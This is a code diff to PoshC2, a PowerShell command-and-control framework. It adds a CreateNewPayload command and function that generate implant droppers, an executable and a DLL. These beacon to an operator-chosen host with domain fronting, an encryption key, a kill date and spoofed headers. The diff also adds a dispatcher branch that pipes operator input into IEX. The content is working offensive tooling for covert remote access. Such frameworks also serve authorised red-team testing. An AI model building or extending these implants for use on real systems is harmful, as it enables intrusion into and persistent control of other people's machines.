@@ -124,7 +124,7 @@ $header = '
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v3.6 www.PoshC2.co.uk =============" -ForegroundColor Green
+            Write-Host "============== v3.7 www.PoshC2.co.uk =============" -ForegroundColor Green
             Write-Host ""
             foreach ($implant in $dbresults) 
             { 
@@ -178,6 +178,10 @@ $header = '
             elseif ($global:implantid -eq "?"){
                $HelpOutput = "PrintMainHelp"
                startup
+            }
+            if ($global:implantid.ToLower().StartsWith("createnewpayload")){
+                $global:implantid | IEX
+                $HelpOutput = "Created New Payloads"
             }
             elseif ($global:implantid.ToLower().StartsWith("set-defaultbeacon")) 
             {
@@ -470,6 +474,7 @@ $header = '
         write-host " ListModules " -ForegroundColor Green
         write-host " PwnSelf (Alias: P)" -ForegroundColor Green
         write-host " Creds -Action <dump/add/del/search> -Username <username> -password/-hash"-ForegroundColor Green 
+        write-host " CreateNewPayload -hostname https://hostname.com -domainfrontheader <url> " -ForegroundColor Green 
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green  
     }
 
@@ -799,6 +804,29 @@ primer | iex }'
         # Return Patched DLL
         return $DllBytes
     }
+
+# create proxypayloads
+function CreateNewPayload 
+{
+    param
+    (
+        [Parameter(Mandatory=$true)][AllowEmptyString()][string]$hostname,
+        [Parameter(Mandatory=$false)][AllowEmptyString()][string]$domainfrontheader
+    )
+    if ($Insecure -eq "Yes") {
+        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $hostname -serverport $serverport -Insecure -useragent $useragent -Referer $Referer
+    } else {
+        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $hostname -serverport $serverport -useragent $useragent -Referer $Referer
+    }
+    $dom = $hostname -replace "https://",""
+    $dom = $dom -replace "http://",""
+    
+    $payload = createrawpayload -command $command
+    # create proxy payloads
+    CreatePayload -Domain $dom
+    CreateStandAloneExe -Domain $dom
+    CreateDLL -Domain $dom
+}
 
 # create proxypayloads
 function CreateProxyPayload 
